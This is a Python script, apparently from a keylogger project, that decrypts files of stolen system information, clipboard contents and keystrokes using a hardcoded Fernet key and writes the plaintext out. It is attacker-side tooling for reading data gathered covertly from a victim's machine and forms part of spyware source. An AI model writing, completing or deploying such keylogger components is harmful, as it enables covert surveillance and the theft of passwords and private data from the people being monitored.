from cryptography.fernet import Fernet

key = "PwgaOzW7UItVOq6-iLwwQPSvDIx1kBm3zfxm0QFTktE="

system_data_encrypted = 'encrypted_system_info.txt'
clipboard_data_encrypted = 'encrypted_clipboard.txt'
keys_data_encrypted = 'encrypted_keylog.txt'

new_encrypted_files = [system_data_encrypted, clipboard_data_encrypted, keys_data_encrypted]
count = 0

for decrypting_files in new_encrypted_files:
    with open(new_encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    if count == 0:
        with open("system_information_decrypted_file.txt", 'ab') as f:
           f.write(decrypted)
    if count == 1:
        with open("clipboard_information_decrypted_file.txt", 'ab') as f:
           f.write(decrypted)
    if count == 2:
        with open("keys_information_decrypted_file.txt", 'ab') as f:
           f.write(decrypted)
    count += 1
